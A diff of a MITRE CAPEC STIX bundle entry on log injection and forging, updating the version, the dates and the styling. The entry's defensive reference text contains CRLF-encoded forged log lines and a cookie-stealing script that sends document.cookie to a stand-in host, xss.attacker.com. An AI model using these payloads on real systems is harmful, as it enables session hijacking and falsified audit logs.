@@ -1,5 +1,5 @@
 {
-    "id": "bundle--8958f27b-c46f-431c-8231-625b248d6f2d",
+    "id": "bundle--ee86cc18-ff88-4f6e-87a5-71ae1862c13c",
     "objects": [
         {
             "created": "2014-06-23T00:00:00.000Z",
@@ -27,12 +27,6 @@
                     "url": "http://cwe.mitre.org/data/definitions/150.html"
                 },
                 {
-                    "description": "Indicator Removal on Host",
-                    "external_id": "T1070",
-                    "source_name": "ATTACK",
-                    "url": "https://attack.mitre.org/wiki/Technique/T1070"
-                },
-                {
                     "description": "J. Viega, G. McGraw, Building Secure Software, 2002, Addison-Wesley",
                     "external_id": "REF-131",
                     "source_name": "reference_from_CAPEC"
@@ -57,7 +51,7 @@
                 }
             ],
             "id": "attack-pattern--1dd1397d-816a-4093-86a6-cf28bb32e486",
-            "modified": "2021-06-24T00:00:00.000Z",
+            "modified": "2022-09-29T00:00:00.000Z",
             "name": "Log Injection-Tampering-Forging",
             "object_marking_refs": [
                 "marking-definition--17d82bb2-eeeb-4898-bda5-3ddbcd2b799d"
@@ -80,9 +74,9 @@
             ],
             "x_capec_example_instances": [
                 "Dave Nielsen and Patrick Breitenbach PayPal Web Services (aka PHP Toolkit) 0.50, and possibly earlier versions, allows remote attackers to enter false payment entries into the log file via HTTP POST requests to ipn_success.php. See also: CVE-2006-0201",
-                "\n               <xhtml:p>If a user submits the string \"twenty-one\" for val, the following entry is logged:</xhtml:p>\n               <xhtml:div style=\"margin-left:10px;\" class=\"result\">INFO: Failed to parse val=twenty-one</xhtml:div>\n               <xhtml:p>However, if an attacker submits the string</xhtml:p>\n               <xhtml:div style=\"margin-left:10px;\" class=\"attack\">twenty-one%0a%0aINFO:+User+logged+out%3dbadguy</xhtml:div>\n               <xhtml:p>the following entry is logged:</xhtml:p>\n               <xhtml:div style=\"margin-left:10px;\" class=\"result\">INFO: Failed to parse val=twenty-oneINFO: User logged out=badguy</xhtml:div>\n               <xhtml:p>Clearly, attackers can use this same mechanism to insert arbitrary log entries.</xhtml:p>\n            "
+                "\n               <xhtml:p>If a user submits the string \"twenty-one\" for val, the following entry is logged:</xhtml:p>\n               <xhtml:div style=\"margin-left:1em;\" class=\"result\">INFO: Failed to parse val=twenty-one</xhtml:div>\n               <xhtml:p>However, if an attacker submits the string</xhtml:p>\n               <xhtml:div style=\"margin-left:1em;\" class=\"attack\">twenty-one%0a%0aINFO:+User+logged+out%3dbadguy</xhtml:div>\n               <xhtml:p>the following entry is logged:</xhtml:p>\n               <xhtml:div style=\"margin-left:1em;\" class=\"result\">INFO: Failed to parse val=twenty-oneINFO: User logged out=badguy</xhtml:div>\n               <xhtml:p>Clearly, attackers can use this same mechanism to insert arbitrary log entries.</xhtml:p>\n            "
             ],
-            "x_capec_execution_flow": "<h2> Execution Flow </h2><div><h3>Explore</h3><ol><li> <p> <b>Determine Application's Log File Format: </b>The first step is exploratory meaning the attacker observes the system. The attacker looks for action and data that are likely to be logged. The attacker may be familiar with the log format of the system.</p></li><table><tbody><tr><th>Techniques</th></tr><tr><td>Determine logging utility being used by application (e.g. log4j)</td></tr><tr><td>Gain access to application's source code to determine log file formats.</td></tr><tr><td>Install or obtain access to instance of application and observe its log file format.</td></tr></tbody></table></ol></div><div><h3>Exploit</h3><ol><li> <p> <b>Manipulate Log Files: </b>The attacker alters the log contents either directly through manipulation or forging or indirectly through injection of specially crafted input that the target software will write to the logs. This type of attack typically follows another attack and is used to try to cover the traces of the previous attack.</p></li><table><tbody><tr><th>Techniques</th></tr><tr><td>\n                  <xhtml:p>Use carriage return and/or line feed characters to start a new line in the log file, and then, add a fake entry. For example:</xhtml:p>\n                  <xhtml:div style=\"margin-left:10px;\" class=\"attack\">\"%0D%0A[Thu%20Nov%2012%2011:22]:Info:%20User%20admin%20logged%20in\"</xhtml:div>\n                  <xhtml:p>may add the following forged entry into a log file:</xhtml:p>\n                  <xhtml:div style=\"margin-left:10px;\" class=\"result\">\"[Thu Nov 12 12:11:22]:Info: User admin logged in\"</xhtml:div>\n                  <xhtml:p>Different applications may require different encodings of the carriage return and line feed characters.</xhtml:p>\n               </td></tr><tr><td>\n                  <xhtml:p>Insert a script into the log file such that if it is viewed using a web browser, the attacker will get a copy of the operator/administrator's cookie and will be able to gain access as that user. For example, a log file entry could contain</xhtml:p>\n                  <xhtml:div style=\"margin-left:10px;\" class=\"attack\"><script>new Image().src=\"http://xss.attacker.com/log_cookie?cookie=\"+encodeURI(document.cookie);</script></xhtml:div>\n                  <xhtml:p>The script itself will be invisible to anybody viewing the logs in a web browser (unless they view the source for the page).</xhtml:p>\n               </td></tr></tbody></table></ol></div>",
+            "x_capec_execution_flow": "<h2> Execution Flow </h2><div><h3>Explore</h3><ol><li> <p> <b>Determine Application's Log File Format: </b>The first step is exploratory meaning the attacker observes the system. The attacker looks for action and data that are likely to be logged. The attacker may be familiar with the log format of the system.</p></li><table><tbody><tr><th>Techniques</th></tr><tr><td>Determine logging utility being used by application (e.g. log4j)</td></tr><tr><td>Gain access to application's source code to determine log file formats.</td></tr><tr><td>Install or obtain access to instance of application and observe its log file format.</td></tr></tbody></table></ol></div><div><h3>Exploit</h3><ol><li> <p> <b>Manipulate Log Files: </b>The attacker alters the log contents either directly through manipulation or forging or indirectly through injection of specially crafted input that the target software will write to the logs. This type of attack typically follows another attack and is used to try to cover the traces of the previous attack.</p></li><table><tbody><tr><th>Techniques</th></tr><tr><td>\n                  <xhtml:p>Use carriage return and/or line feed characters to start a new line in the log file, and then, add a fake entry. For example:</xhtml:p>\n                  <xhtml:div style=\"margin-left:1em;\" class=\"attack\">\"%0D%0A[Thu%20Nov%2012%2011:22]:Info:%20User%20admin%20logged%20in\"</xhtml:div>\n                  <xhtml:p>may add the following forged entry into a log file:</xhtml:p>\n                  <xhtml:div style=\"margin-left:1em;\" class=\"result\">\"[Thu Nov 12 12:11:22]:Info: User admin logged in\"</xhtml:div>\n                  <xhtml:p>Different applications may require different encodings of the carriage return and line feed characters.</xhtml:p>\n               </td></tr><tr><td>\n                  <xhtml:p>Insert a script into the log file such that if it is viewed using a web browser, the attacker will get a copy of the operator/administrator's cookie and will be able to gain access as that user. For example, a log file entry could contain</xhtml:p>\n                  <xhtml:div style=\"margin-left:1em;\" class=\"attack\"><script>new Image().src=\"http://xss.attacker.com/log_cookie?cookie=\"+encodeURI(document.cookie);</script></xhtml:div>\n                  <xhtml:p>The script itself will be invisible to anybody viewing the logs in a web browser (unless they view the source for the page).</xhtml:p>\n               </td></tr></tbody></table></ol></div>",
             "x_capec_likelihood_of_attack": "High",
             "x_capec_prerequisites": [
                 "The target host is logging the action and data of the user.",
@@ -94,7 +88,7 @@
             },
             "x_capec_status": "Draft",
             "x_capec_typical_severity": "High",
-            "x_capec_version": "3.7"
+            "x_capec_version": "3.8"
         }
     ],
     "spec_version": "2.0",
